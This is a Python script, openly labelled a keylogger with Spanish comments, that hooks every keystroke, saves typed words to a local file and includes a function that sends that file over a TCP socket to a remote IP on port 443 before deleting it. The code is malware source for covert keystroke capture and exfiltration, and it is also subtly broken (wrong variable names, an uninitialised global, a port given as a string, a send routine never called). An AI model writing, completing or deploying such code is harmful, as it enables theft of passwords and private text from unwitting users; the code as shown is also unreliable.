import keyboard
import sys
import socket
import os
# import datetime  # Deseable si quiero saber cuando las pulsó

""" 

NOTAS IMPORTANTES

Al desarrollar este programa dentro de un wsl, windows no permite que este tengo acceso a lo que se teclea en windows
y puede dar problemas.

Si se estuviera en ubuntu, al hacer uso de keyboard, que accede a carpetas de hardware a las que solo puede entrar root
habría que probar a meterlo en el grupo input con -> sudo usermod -aG input user
"""

print ("KEYLOGGER")

# Función que regista en una variable global las palabras pulsadas
def pulsación_tecla(tecla_pulsada):
    global palabra

    # If que detecta cuando una tecla a sido pulsada
    if tecla_pulsada.event_type == keyboard.KEY_DOWN:
        # Se llama a la funcion de guardado de palabra si se pulsan ciertas teclas
        if tecla_pulsada.name == 'space' or tecla_pulsada.name == 'enter':
            guardar_palabra(tecla_pulsada.name)
        elif len(tecla_pulsada.name) == 1 and pulsación_tecla.name.isprintable():
            palabra += pulsación_tecla.name

keyboard.hook(pulsación_tecla)

def guardar_palabra(tecla_pulsada):
    match (tecla_pulsada):
        case 'space':
            with open('palabras.txt', 'a') as file:
                file.write(palabra + '\n')
                reset_palabra()

def reset_palabra():
    global palabra
    palabra = ""

def enviar_archivo_sockets(fichero, ip, puerto):
    try:
        with open('palabras.txt', 'rb') as file:
            contenido = file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            conexion.connect((ip, puerto))
            conexion.sendall(contenido)
            os.remove('palabras.txt')
            sys.exit()
    except Exception as e:
        print(f'Error de conexión: {e}')

def detener_script():
    print('DETENIENDO Y ENVIANDO')
    keyboard.unhook_all()
    enviar_archivo_sockets(fichero_mensaje, direccion_ip_destino, puerto_destino)


direccion_ip_destino = '0.0.0.0'
puerto_destino = '443'
fichero_mensaje = 'palabras.txt'

try:
    keyboard.wait('esc')
except KeyboardInterrupt:
    print ("DETENIDO")
    pass